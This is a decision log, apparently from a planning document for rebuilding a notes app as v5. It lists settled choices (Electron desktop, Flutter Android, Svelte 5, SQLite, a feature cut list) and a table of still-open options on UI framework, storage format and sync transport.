- **Platform strategy:** desktop stays on Electron, Android stays on Flutter. Sync v2 is a written spec plus shared fixtures.
- **Order:** desktop first. Desktop is the daily driver; Android follows after Sync v2.
- **Visual direction:** quiet tool interface with an editorial note body. The approved sample is `docs/v5/interface-sample.html`.
- **Cut list:** §6.10 approved as written, so Drive share links, the AI template generator and the Advanced Search panel are all dropped.
- **v4.1 hotfix:** skipped. The user reads in v4 and writes nothing until v5 is ready.
- **UI framework:** Svelte 5. **Storage:** SQLite (`node:sqlite`, confirmed working inside Electron 44).

**Still open:**

| # | Decision | Recommended | Alternatives |
|---|---|---|---|
| 1 | ~~**Platform strategy**~~ **Decided: Electron + Flutter** | **Rebuild desktop on Electron now; Android stays Flutter**, kept in sync through the v2 protocol spec and fixtures. Fastest to ship, best markdown editor (CodeMirror), and your JS skills carry over. | **Flutter everywhere:** extend the Android app to desktop. One codebase, and its SQLite layer is already healthier, but it is unaudited and desktop text editing is weaker. **Tauri 2 everywhere:** web UI plus Rust core on desktop and mobile. Smallest and most secure, but the biggest rewrite, and Rust is new to the project. |
| 2 | UI framework | **Svelte 5**: least boilerplate, stores built in | React (biggest ecosystem), vanilla TS + lit-html |
| 3 | Visual direction | **Quiet tool chrome, editorial note body** (§6.9) | Keep the full editorial skin but make it functional |
| 4 | Storage format | **SQLite** as the source of truth | A plain-markdown "vault" folder (Obsidian-style): portable, but file watching, renames and metadata sidecars add complexity |
| 5 | Sync transport | **Drive v2 with an app-owned OAuth client**; a folder transport (Syncthing/Dropbox/Nextcloud) later costs little | Keep user-supplied credentials; WebDAV first |
| 6 | ~~Android timing~~ | **Decided:** desktop first, so desktop↔Android sync pauses until the port (§7) | |
| 7 | ~~Cut list~~ | **Decided:** §6.10 approved | |
